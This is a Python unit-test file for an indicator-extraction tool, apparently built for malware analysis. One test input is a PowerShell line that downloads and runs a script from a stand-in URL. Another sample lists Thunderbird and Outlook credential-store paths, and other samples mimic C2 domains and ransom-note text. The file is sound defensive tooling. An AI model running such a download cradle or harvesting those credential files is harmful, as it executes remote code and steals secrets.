#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import inspect

from .. import TestUnitBase


class TestPatternExtractor(TestUnitBase):

    def test_extraction_environment_variable(self):
        unit = self.load('environment-variable')
        self.assertEqual(b'%TEST%', unit(B'This is a %TEST% with environment variable.'))

    def test_extraction_domain_01(self):
        unit = self.load('domain')
        self.assertEqual(b'google.com', unit(b'Just use google.com. It is the best.'))

    def test_extraction_domain_02(self):
        unit = self.load('domain')
        self.assertEqual(b'evil.c2server.com', unit(b'\x00\x00\x00evil.c2server.com\x52\x50\x00\x00\x00'))

    def test_extraction_domain_03(self):
        unit = self.load('domain')
        self.assertEqual(b'evil.c2server.com', unit(b'\x00\x00\x00evil.c2server.com\x50\x00\x00\x00\x00'))

    def test_extraction_domain_04(self):
        unit = self.load('domain')
        self.assertEqual(b'', unit(
            b'\x00ios_base::eofbit set\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
            b'b\x00u\x00i\x00l\x00d\x00.\x00b\x00i\x00n\x00\x00\x00\x00\x00\x00\x00')
        )

    def test_extraction_domain_05(self):
        unit = self.load('domain', filter=1)
        self.assertEqual(b'', unit(b'\xFA\xF0-b.app\x00\x00'))

    def test_filter_01(self):
        unit = self.load('domain', filter=True)
        self.assertEqual(b'www.evilscam-124rd23d23.notmicrosoft.com',
            unit(b'Just click <a href="www.evilscam-124rd23d23.notmicrosoft.com">here!</a>'))

    def test_extract_uppercase_guids(self):
        unit = self.load('guid')
        data = B'An uppercase GUID! A5371AF2-2000-4A4C-ADD2-5E6F1E302B41'
        self.assertEqual(unit(data), B'A5371AF2-2000-4A4C-ADD2-5E6F1E302B41')

    def test_real_domain_with_dash(self):
        data = bytes.fromhex(
            '10 10 73 61 6E 73 2D 73 65 72 69 66 2D 6C 69 67'  # ..sans-serif-lig
            '68 74 00 15 15 47 6F 6F 67 6C 65 2D 63 6F 6D 2E'  # ht...Google-com.
            '6C 69 6E 6B 70 63 2E 6E 65 74 00 05 05 31 30 37'  # linkpc.net...107
            '31 37 00 04 04 6E 75 6C 6C 00 07 07 53 65 72 76'  # 17...null...Serv
        )
        unit = self.load('domain')
        hits = list(unit.process(data))
        self.assertIn(b'Google-com.linkpc.net', hits)

    def test_email_with_dash(self):
        data = (
            B'\r\r\nBart_simpson@springfield.name\r\r\n'
            B'&nbsp;&nbsp;&nbsp;&nbsp;<small><small>or</small></small>&nbsp;&nbsp;&nbsp;&nbsp;'
            B'\r\r\nlisa_simpson02@protonmail.com'
        )
        unit = self.load('email')
        hits = list(unit.process(data))
        self.assertIn(b'Bart_simpson@springfield.name', hits)
        self.assertIn(b'lisa_simpson02@protonmail.com', hits)

    def test_email_allcaps(self):
        data = (
            B'Email us at ALEXANDER.IRWIN@PROTONMAIL.COM (or) MISAEL.SHORT@TUTANOTA.COM to get the ransom amount.'
            B'Keep our contacts safe. Disclosure can lead to impossibility of decryption.'
        )
        unit = self.load('email')
        hits = list(unit.process(data))
        self.assertIn(b'ALEXANDER.IRWIN@PROTONMAIL.COM', hits)
        self.assertIn(b'MISAEL.SHORT@TUTANOTA.COM', hits)

    def test_email_with_symbols(self):
        self.assertEqual(self.load('email', filter=True)(B'.###/.test@host.com.Q@aVw5w.tR.'), B'test@host.com')

    def test_url_with_tilde(self):
        url = B'http://www.htz.klmp.cv.gov.edu/~drjay/obbx/grades.txt'
        self.assertEqual(self.load('url')(url), url)

    def test_monero_address(self):
        addr = B'4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQni58KYZqH43YSDeqY'
        data = B'payment is made to the wallet %s.' % addr
        self.assertEqual(addr, self.load('xmr')(data))

    def test_weird(self):
        data = (
            B'"https://local.sys/data/t:ffa0",'
            B'"https://local.sys/data/t:ffa6",'
            B'"https://local.sys/data/t:d141",'
            B'"https://local.sys/data/t:dc55",'
            B'"https://local.sys/data/t:59ee",'
            B'"https://local.sys/data/t:ed29",'
            B'"https://local.sys/data/t:dc9b",'
            B'"https://local.sys/data/t:f928",'
            B'"https://local.sys/data/t:2594",'
            B'"https://local.sys/data/t:3693",'
            B'"https://local.sys/data/t:5698",'
            B'"https://local.sys/data/t:561c",'
            B'"https://local.sys/data/t:5627",'
            B'"https://local.sys/data/t:562f",'
        )
        unit = self.load('url')
        self.assertEqual(len(list(unit.process(data))), 14)

    def test_multiline_unicode(self):
        @inspect.getdoc
        class pem:
            """
            -----BEGIN DH PARAMETERS-----
            MIICCAKCAgEA45KZVdTCptcakXZb7jJvSuuOdMlUbl1tpncHbQcYbFhRbcFmmefp
            bOmZsTowlWHQpoYRRTe6NEvYox8J+44i/X5cJkMTlIgMb0ZBty7t76U9f6qAId/O
            6elE0gnk2ThER9nmBcUA0ZKgSXn0XCBu6j5lzZ0FS+bx9OVNhlzvIFBclRPXbI58
            71dRoTjOjfO1SIzV69T3FoKJcqur58l8b+no/TOQzekMzz4XJTRDefqvePhj7ULP
            Z/Zg7vtEh11h8gHR0/rlF378S05nRMq5hbbJeLxIbj9kxQunETSbwwy9qx0SyQgH
            g+90+iUCrKCJ9Fb7WKqtQLkQuzJIkkXkXUyuxUuyBOeeP9XBUAOQu+eYnRPYSmTH
            GkhyRbIRTPCDiBWDFOskdyGYYDrxiK7LYJQanqHlEFtjDv9t1XmyzDm0k7W9oP/J
            p0ox1+WIpFgkfv6nvihqCPHtAP5wevqXNIQADhDk5EyrR3XWRFaySeKcmREM9tbc
            bOvmsEp5MWCC81ZsnaPAcVpO66aOPojNiYQZUbmm70fJsr8BDzXGpcQ44+wmL4Ds
            k3+ldVWAXEXs9s1vfl4nLNXefYl74cV8E5Mtki9hCjUrUQ4dzbmNA5fg1CyQM/v7
            JuP6PBYFK7baFDjG1F5YJiO0uHo8sQx+SWdJnGsq8piI3w0ON9JhUvMCAQI=
            -----END DH PARAMETERS-----
            """
        data = pem.encode('utf-16le')
        unit = self.load('pem')
        self.assertEqual(pem, str(data | unit))

    def test_sha256(self):
        hashes = [
            B'1ad2067318ad2e25cc6675fad382aba64dc36695ee6117f811fd0aac8eb9d6bd',
            B'1AD2067318AD2E25CC6675FAD382ABA64DC36695EE6117F811FD0AAC8EB9D6BD',
        ]
        data = b'Lower: %s\nUpper: %s' % tuple(hashes)
        self.assertListEqual(list(data | self.load('sha256')), hashes)

    def test_md5(self):
        hashes = [
            B'1ad2675fa382ab6d3665ee6111b9d6bd',
            B'1AD2675FA382AB6D3665EE6111B9D6BD',
        ]
        data = b'Lower: %s\nUpper: %s' % tuple(hashes)
        self.assertListEqual(list(data | self.load('md5')), hashes)

    def test_sha1(self):
        hashes = [
            B'1ad2675fad382aba64dc36695ee6117f81b9d6bd',
            B'1AD2675FAD382ABA64DC36695EE6117F81B9D6BD',
        ]
        data = b'Lower: %s\nUpper: %s' % tuple(hashes)
        self.assertListEqual(list(data | self.load('sha1')), hashes)

    def test_ipv4_filters(self):
        data = inspect.cleandoc(
            """
            1.0.0.0
            ..............................
            Version 2.1.1.0
            ..............................
            192.168.2.1
            10.12.12.1
            ..............................
            254.12.3.13
            185.12.3.13
            """
        ).encode('latin1')
        self.assertEqual(
            {bytes(v) for v in data | self.load('ipv4', filter=0)},
            {B'185.12.3.13', B'254.12.3.13', B'1.0.0.0', B'2.1.1.0', B'192.168.2.1', B'10.12.12.1'}
        )
        self.assertEqual(
            {bytes(v) for v in data | self.load('ipv4', filter=1)},
            {B'185.12.3.13', B'254.12.3.13', B'192.168.2.1', B'10.12.12.1'}
        )
        self.assertEqual(
            {bytes(v) for v in data | self.load('ipv4', filter=3)},
            {B'185.12.3.13'}
        )

    def test_url_filters(self):
        self.assertEqual('http://www.example.com/',
            str(B'tthttp://www.example.com/' | self.load('url', filter=1)))

    def test_path_extraction(self):
        data = inspect.cleandoc(
            R"""
            C:\Users\Public\payload.ps1
            C:\Users\Public\Health\payload.ps1
            C:\Users\Public\Health\launcher.exe
            C:\Users\Public\Health\launcher.exe.manifest
            """
        ).encode("utf8")
        self.assertEqual(data | self.load('path', filter=2) | bytes, data)

    def test_strip_quote_from_url_regression(self):
        data = "iex (New-Object System.Net.WebClient).DownloadString('http://www.example.com/boom');".encode('utf-16le')
        url = str(data | self.load('url'))
        self.assertEqual(url, 'http://www.example.com/boom')

    def test_webDAV_paths(self):
        data = B"\\\\1.1.1.1@556\\the\\finest\\binaires"
        self.assertEqual(data, data | self.load('path') | bytes)

    def test_registry_paths(self):
        data = BR'''
            \Thunderbird\Profiles\
            %s%s\logins.json
            %s%s\key4.db
            SOFTWARE\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676\
            Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676
            Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676
        '''
        unit = self.load('path')
        test = data | unit | [str]
        self.assertIn(
            R'Software\Microsoft\Windows Messaging Subsystem\Profiles\9375CFF0413111d3B88A00104B2A6676', test
        )

    def test_ipv4_among_dots(self):
        data = b'..12.56.104.12.....49.56.250.80.....90.18.112.77..'
        iocs = data | self.load() | [str]
        self.assertListEqual(iocs, [
            '12.56.104.12',
            '49.56.250.80',
            '90.18.112.77',
        ])
